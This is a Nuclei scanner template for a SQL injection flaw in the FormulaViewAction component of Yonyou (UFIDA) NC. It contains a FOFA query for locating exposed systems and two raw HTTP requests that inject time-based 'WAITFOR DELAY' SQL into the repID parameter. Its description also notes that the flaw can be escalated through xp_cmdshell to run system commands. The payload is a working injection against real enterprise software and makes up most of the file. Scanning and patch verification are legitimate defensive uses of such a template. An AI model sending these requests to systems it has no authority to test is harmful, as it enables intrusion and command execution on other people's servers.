id: yongyouNC-FormulaViewAction-sql

info:
  name: "用友 NC FormulaViewAction 组件 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
    用友NC系统在/service/~iufo/com.ufida.web.action.ActionServlet接口的FormulaViewAction组件中存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，结合数据库扩展存储过程xp_cmdshell执行任意系统命令，从而实现对目标服务器的控制。该漏洞利用条件较低，建议用户及时应用安全补丁以消除风险。
  reference:
  - https://mp.weixin.qq.com/s/rBZqaPymRHTZpFhRu2l6Cw
  tags: 用友NC

http:
- raw:
  - |
    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:4'--+&unitID=public HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    SOAPAction: http://tempuri.org/GetHomeInfo
    Accept-Encoding: identity
    Accept: */*
    Connection: keep-alive
  - |
    GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:8'--+&unitID=public HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    SOAPAction: http://tempuri.org/GetHomeInfo
    Accept-Encoding: identity
    Accept: */*
    Connection: keep-alive

  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
